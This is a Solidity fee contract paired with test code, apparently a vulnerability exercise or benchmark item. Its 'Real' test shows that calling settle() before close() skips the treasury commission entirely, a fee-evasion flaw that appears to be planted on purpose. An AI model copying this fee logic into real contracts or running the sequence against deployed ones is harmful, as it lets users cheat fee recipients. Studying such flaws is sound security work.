// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Base,Token} from "common/Support.sol";
contract Fees {
    Token public immutable token;
    address public immutable treasury;
    mapping(address=>uint256) public premium;
    mapping(address=>uint256) public notional;
    constructor(Token t,address user,address collector) {
        token=t;treasury=collector;premium[user]=1000;notional[user]=10000;
    }
    function settle() external {
        uint256 p=premium[msg.sender];
        premium[msg.sender]=0;
        pay(p,0);
    }
    function close() external {
        uint256 n=notional[msg.sender];
        uint256 p=premium[msg.sender];
        notional[msg.sender]=0;
        premium[msg.sender]=0;
        pay(p,n);
    }
    function pay(uint256 p,uint256 n) private {
        uint256 pf=p/10;
        uint256 nf=n/100;
        uint256 fee=pf<nf?pf:nf;
        require(token.transfer(treasury,fee));
        require(token.transfer(msg.sender,p-fee));
    }
}
contract Proof is Base {
    function setup() internal returns(Token t,Fees f) {
        t=new Token(); f=new Fees(t,ALICE,CAROL); t.mint(address(f),1000);
    }
    function testDecoyZeroTransferSucceedsAndPreservesBalances() external {
        (Token t,Fees f)=setup();
        vm.prank(address(f)); bool ok=t.transfer(CAROL,0);
        require(ok && t.balanceOf(address(f))==1000 && t.balanceOf(CAROL)==0,"zero transfer lost funds");
        vm.prank(ALICE); f.close();
        require(t.balanceOf(CAROL)==100 && t.balanceOf(ALICE)==900,"normal fee failed");
        vm.prank(ALICE); f.close();
        require(t.balanceOf(CAROL)==100 && t.balanceOf(ALICE)==900,"zero close changed balances");
    }
    function testRealSettleThenClosePaysNoCommission() external {
        (Token t,Fees f)=setup();
        vm.prank(ALICE); f.settle();
        vm.prank(ALICE); f.close();
        require(t.balanceOf(CAROL)==0 && t.balanceOf(ALICE)==1000,"commission not omitted");
        require(f.premium(ALICE)==0 && f.notional(ALICE)==0 && t.balanceOf(address(f))==0,"position not closed");
    }
}
